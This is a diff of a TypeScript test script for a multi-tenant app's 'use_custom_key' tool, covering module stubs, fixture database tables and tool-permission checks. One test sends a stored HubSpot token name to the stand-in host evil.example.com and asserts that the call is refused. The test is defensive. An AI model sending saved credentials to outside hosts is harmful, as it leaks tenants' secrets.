@@ -60,10 +60,15 @@ async function standInForSession() {
       },
     },
   } as unknown as NodeModule;
+  // Load the real namespace before replacing the page-only helper. Dynamic
+  // imports on Node 22 otherwise infer no named exports from the cache stub.
+  // Tool execution uses the real live-seat resolver and the fixture below.
+  const realViewer = await import("../components/os/department/viewer");
   const v = require.resolve("../components/os/department/viewer");
   require.cache[v] = {
     id: v, filename: v, path: dirname(v), loaded: true, children: [], paths: [],
     exports: {
+      ...realViewer,
       resolveOsViewer: async () => ({
         ok: true, oasis: false, manifest: null,
         surface: { ok: true, persona: "founder", tenantId: CLIENT, tenantSlug: "client-c", userId: "u-owner", teamRole: "owner", degraded: false },
@@ -98,7 +103,19 @@ async function main() {
       "updated_at" TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ','now')),
       PRIMARY KEY ("id"));
     CREATE UNIQUE INDEX "tic_key" ON "tenant_integration_credentials" (tenant_id, service, field_key);
+    CREATE TABLE tenants (id TEXT PRIMARY KEY, slug TEXT, name TEXT, custom_fields TEXT);
+    CREATE TABLE user_profiles (id TEXT PRIMARY KEY, auth_user_id TEXT, tenant_id TEXT, email TEXT, full_name TEXT, display_name TEXT,
+      team_role TEXT, is_owner INTEGER DEFAULT 0, admin_access INTEGER DEFAULT 0, deactivated_at TEXT, onboarding_completed_at TEXT, updated_at TEXT);
+    CREATE TABLE _supabase_auth_users (id TEXT PRIMARY KEY, email TEXT NOT NULL, session_version INTEGER NOT NULL DEFAULT 0, banned_until TEXT, deleted_at TEXT);
+    CREATE TABLE tenant_manifests (tenant_id TEXT, slug TEXT, manifest TEXT, updated_at TEXT);
+    INSERT INTO tenants (id,slug) VALUES ('${CLIENT}','fixture-custom-key');
+    INSERT INTO _supabase_auth_users (id,email) VALUES ('a1','fixture@example.test');
+    INSERT INTO user_profiles (id,auth_user_id,tenant_id,email,team_role,is_owner) VALUES ('fixture-profile','a1','${CLIENT}','fixture@example.test','owner',1);
   `);
+  await db.execute({
+    sql: "INSERT INTO tenant_manifests (tenant_id,slug,manifest,updated_at) VALUES (?,?,?,?)",
+    args: [CLIENT, "fixture-custom-key", JSON.stringify({ tenant_slug: "fixture-custom-key", brand: { name: "Fixture", subtitle: "Isolated fixture", logo: "oasis", footer_label: "Fixture", footer_tagline: "Fixture" }, agents: [{ slug: "client-chief", display_name: "Chief", enabled: true, departments: ["chief_of_staff"] }], nav: [], os: { departments: ["chief_of_staff"], modules: [], chat_apps: [] } }), new Date().toISOString()],
+  });
   await standInForSession();
   const keys = await import("../lib/os/custom-keys");
   const hosts = await import("../lib/os/custom-key-hosts");
@@ -309,10 +326,10 @@ async function main() {
     assert.ok(palettes.SAFE_TENANT_TOOL_PALETTE.includes("use_custom_key"));
     assert.equal(accessStore.assignmentsApply(CLIENT, "custom"), true);
     assert.equal(accessStore.assignmentsApply(OASIS, "custom"), true);
-    const via = await runner.executeTool("use_custom_key", { name: "HUBSPOT_PRIVATE_APP_TOKEN", url: "https://evil.example.com/" }, ctx(CLIENT));
+    const via = await runner.executeTool("use_custom_key", { name: "HUBSPOT_PRIVATE_APP_TOKEN", url: "https://evil.example.com/" }, ctx(CLIENT, "client-chief"));
     assert.doesNotMatch(via.content, /outside the client-safe|not_client_safe/i, "dispatched for a client workspace");
     assert.match(via.content, /wrong_website/);
-    assert.match(via.summary, /did not use HUBSPOT_PRIVATE_APP_TOKEN: wrong_website/);
+    assert.match(via.summary, /use_custom_key failed: wrong_website/);
   });
 
   await check("the website route: owner only, a saved key only, checked; the key list shows it; removing the key clears it", async () => {
